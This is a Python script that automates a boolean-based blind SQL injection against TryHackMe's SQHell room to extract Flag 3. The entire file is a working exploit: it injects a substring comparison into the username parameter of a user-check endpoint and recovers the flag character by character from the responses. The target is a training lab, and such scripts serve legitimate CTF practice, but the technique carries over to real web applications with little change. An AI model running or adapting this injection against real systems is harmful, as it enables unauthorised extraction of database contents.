#!/usr/bin/env python3

import requests
import string
import argparse

parser = argparse.ArgumentParser(description='A simple python script to automate boolean-based SQL injection for TryHackMe\'s SQHell room, Flag 3.')
parser.add_argument('-i', '--ip', help='The target IP or domain')
args = parser.parse_args()

# From A-Z, 0-9, {}:
char = string.ascii_uppercase + string.digits + '{' + '}' + ':'
flag = ''
counter = 1

while True:
	for characters in char:
		url = f"http://{args.ip}/register/user-check?username=admin' AND (substr((SELECT flag FROM flag LIMIT 0,1),{counter},1)) = '{characters}'-- -"
		r = requests.get(url)

		# If the GET request content contains 'false', then do:
		if 'false' in r.text:
			counter += 1
			flag += ''.join(characters)
			
			# Clear previous line
			print('\r', end='')
			print(f'[+] Flag3 is: {flag}', end='')
			break

	if len(flag) >= 43:
		exit()